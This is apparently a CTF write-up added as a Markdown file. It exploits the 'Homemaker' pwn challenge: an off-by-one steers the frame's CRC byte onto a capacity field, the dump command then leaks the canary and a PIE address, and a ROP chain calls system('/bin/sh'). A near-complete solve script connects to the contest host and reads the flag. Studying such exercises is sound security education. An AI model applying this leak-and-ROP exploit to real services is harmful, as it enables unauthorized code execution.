@@ -1,0 +1,203 @@
+---
+title: 'SunshineCTF 2026 - Homemaker'
+description: 'An off-by-one that lands the frame CRC byte on a capacity field, stretching the dump command until it spills the canary and a PIE pointer'
+date: 2026-09-30
+tags: ['writeup', 'pwn', 'off-by-one', 'rop', 'information-disclosure', 'sunshinectf', '2026']
+authors: ['kudaliar']
+draft: false
+---
+
+A retro-futurist appliance speaking an escape-delimited binary protocol. The append command copies one byte more than it bounds-checks, and the byte that lands out of bounds is the **frame's own CRC** — which is attacker-steerable, because CRC-8 is a bijection in any single input byte.
+
+That one byte falls on a `capacity` field. Stretch it, and the dump command starts spilling the stack canary and a return address.
+
+## Challenge Description
+
+> \# A SERVANT IN EVERY HOME, BY 1975!
+>
+> APEX ATOMIC HOUSEHOLD INDUSTRIES, INC IS PROUD TO ANNOUNCE THE MODEL 7 "HOMEMAKER" DOMESTIC AUTOMATON
+>
+> POWERED THROUGH USE OF PUNCH CARDS, THE MODEL 7 IS EQUIPPED WITH THOUSANDS OF BYTES OF MEMORY!
+
+Provided: `homemaker`. Full RELRO, canary, PIE.
+
+## Initial Analysis
+
+Connecting and sending anything textual returns eight bytes of binary. Hexdumped:
+
+```text
+1b 5b 00 01 e1 59 1b 5c
+```
+
+`1b 5b` is `ESC [` and `1b 5c` is `ESC \`. The frame format falls out of the parser at `0x14cc`:
+
+```text
+1b 5b | len (2 bytes, big endian) | payload | crc | 1b 5c
+```
+
+`crc` is CRC-8 over the payload, polynomial `0x2F`, init 0 — lifted straight from the loop at `0x11e9`:
+
+```asm
+1228:  xor    BYTE PTR [rbp-0xf],al      ; crc ^= data[i]
+123a:  test   al,al
+123c:  jns    1247                       ; if crc & 0x80 == 0
+1240:  add    eax,eax
+1242:  xor    eax,0x2f                   ; else crc = (crc << 1) ^ 0x2f
+1247:  add    eax,eax
+```
+
+The parser rejects `len == 0` or `len + 7 > 0x800`, and reports `0xe1` bad magic, `0xe2` bad length, `0xe3` bad CRC, `0xe4` bad trailer. So that first reply was simply "bad magic".
+
+`payload[0]` is the command. The jump table at `0x21c8` holds six: `1` auth, `2` append, `3` dump, `4` quit, `5` runs `system("/bin/echo -n ''")`, `0` unused. Everything except `1` requires auth.
+
+**Auth** at `0x167c` wants exactly five bytes — `01` then a big-endian key, compared against the constant at `0x12a7`:
+
+```asm
+12a7:  cmp    DWORD PTR [rbp-0x14],0x1337c35f
+12ae:  je     12b7
+```
+
+On success it initialises the session buffer: `capacity = 0x100`, `count = 1`.
+
+## The Vulnerability
+
+`append` at `0x174c` checks the length against capacity, then copies with an inclusive loop bound:
+
+```asm
+1775:  movzx  eax,WORD PTR [rbp-0x34]
+1779:  sub    eax,0x1
+177c:  mov    WORD PTR [rbp-0x12],ax     ; r = len - 1
+1790:  movzx  eax,WORD PTR [rax+0x100]   ; capacity
+1797:  cmp    WORD PTR [rbp-0x12],ax
+179b:  jbe    17a4                       ; proceed if r <= capacity
+...
+17d2:  movzx  eax,WORD PTR [rbp-0x14]
+17d6:  cmp    ax,WORD PTR [rbp-0x12]
+17da:  jbe    17ac                       ; while i <= r
+```
+
+It validates `len - 1 <= capacity` but then runs `i` from `0` through `r` **inclusive**, which is `len` bytes. With `len == 0x101` the check passes against a capacity of `0x100` and the copy writes `0x101` bytes into a `0x100` buffer.
+
+The byte that goes one past the end lands on `buf+0x100` — which is the low byte of `capacity` itself.
+
+And the source of that byte is `src[0x101]`, one past the payload the frame actually carries. In the frame buffer, the byte sitting immediately after the payload is **the CRC**. CRC-8 is a bijection in any single input byte, so brute-forcing the last data byte until the checksum comes out to a chosen value gives complete control of what gets written:
+
+```python
+def append_payload(data, want_crc=None):
+    p = b"\x02" + data
+    if want_crc is None: return p
+    for b in range(256):
+        cand = b"\x02" + data[:-1] + bytes([b])
+        if crc8(cand) == want_crc: return cand
+    raise ValueError("no CRC preimage")
+```
+
+Steer it to `0xff` and `capacity` goes from `0x0100` to `0x01ff`.
+
+## Exploitation
+
+### Leaking with the dump command
+
+`dump` at `0x1810` writes back exactly `capacity` bytes from the buffer:
+
+```asm
+1833:  movzx  eax,WORD PTR [rax+0x100]   ; capacity
+183d:  mov    rax,QWORD PTR [rbp-0x18]
+1841:  mov    rsi,rax
+1844:  mov    edi,0x0
+1849:  call   13a2                       ; send(buf, capacity)
+```
+
+With capacity now 511, it spills 255 bytes past the buffer. Relative to the buffer start:
+
+```text
+  +0x100 = 0x00000000000201ff   capacity (0x01ff) and count
+  +0x108 = 0x4f433bab73ef2f00   canary   (low byte 0x00, as it should be)
+  +0x110 = 0x00007ffe029213e0   saved rbp
+  +0x118 = 0x0000558679d3aa9f   return address
+```
+
+That return address is `pie + 0x1a9f` — the instruction after `call 0x1865` in `main` — so subtracting gives the **PIE base**. No libc leak is needed at all, because everything the chain wants is in the binary.
+
+### The chain
+
+Append `0x108` bytes of filler, the leaked canary, the leaked rbp, then the ROP chain over the return address. Command `4` then leaves the loop, passes the canary check, and returns into it:
+
+```python
+rop = b"".join(p64(x) for x in (pie+RET, pie+POP_RDI, binsh, pie+SYSTEM_PLT))
+payload = b"\x02" + b"B"*0x108 + p64(canary) + p64(savedbp) + rop
+```
+
+Two details decide whether this works.
+
+**The bare `ret` is load-bearing.** Without it `system` is entered with `rsp` misaligned and dies on the first `movaps`. One extra `ret` shifts the stack by eight and fixes it.
+
+**`/bin/sh` has to live in the quit frame, not the append frame.** The parser reads every frame into the same global buffer at `0x4860`, so whatever the append frame carried is overwritten by the next frame that arrives. Putting the string in the *quit* frame's own payload means it is still resident when the chain runs:
+
+```python
+h.send(frame(b"\x04" + b"/bin/sh\x00"))   # sits at pie + 0x4865
+```
+
+```text
+total 12
+-rw-r----- 1 root homemaker 64 Sep 26 00:54 flag.txt
+sun{the_future_is_now_today_well_wait_how_are_you_reading_this}
+```
+
+## Solve Script
+
+```python
+import struct, time
+p64 = lambda x: struct.pack("<Q", x)
+
+RET_OFF    = 0x1a9f     # return into main -> the PIE base anchor
+POP_RDI    = 0x12aa
+RET        = 0x12ab
+SYSTEM_PLT = 0x10c0
+FRAME_BUF  = 0x4860     # global frame buffer; payload starts at +4
+KEY        = 0x1337c35f
+
+def crc8(data, poly=0x2F, init=0x00):
+    crc = init
+    for b in data:
+        crc ^= b
+        for _ in range(8):
+            crc = ((crc << 1) ^ poly) & 0xFF if crc & 0x80 else (crc << 1) & 0xFF
+    return crc
+
+def frame(payload):
+    return b"\x1b[" + struct.pack(">H", len(payload)) + payload + bytes([crc8(payload)]) + b"\x1b\\"
+
+def pwn(target):
+    h = HM(target); h.drain(1.0)
+    h.cmd(b"\x01" + struct.pack(">I", KEY))                     # auth
+
+    # off-by-one: the copy writes len bytes after checking len-1 <= cap,
+    # so the frame's own CRC byte lands on the low byte of capacity
+    h.cmd(append_payload(b"A" * 0x100, want_crc=0xff))          # 0x100 -> 0x01ff
+
+    data = unframe(h.cmd(b"\x03"))[0][1:]                       # dump spills 511 bytes
+    canary  = struct.unpack("<Q", data[0x108:0x110])[0]
+    savedbp = struct.unpack("<Q", data[0x110:0x118])[0]
+    pie     = struct.unpack("<Q", data[0x118:0x120])[0] - RET_OFF
+    assert not (pie & 0xfff) and not (canary & 0xff), "bad leak"
+
+    binsh = pie + FRAME_BUF + 4 + 1        # inside the *quit* frame's payload
+    rop = b"".join(p64(x) for x in (pie+RET, pie+POP_RDI, binsh, pie+SYSTEM_PLT))
+    h.cmd(b"\x02" + b"B"*0x108 + p64(canary) + p64(savedbp) + rop)
+
+    h.send(frame(b"\x04" + b"/bin/sh\x00"))                     # quit -> into the chain
+    time.sleep(0.8); h.drain(0.8)
+    h.send(b"cat flag.txt\n"); time.sleep(0.7)
+    return h.drain(1.2)
+
+print(pwn(("sunshinectf.games", 26008)).decode())
+```
+
+Note the host: this one listens on `sunshinectf.games`, not `chal.sunshinectf.games`.
+
+## Flag
+
+```text
+sun{the_future_is_now_today_well_wait_how_are_you_reading_this}
+```
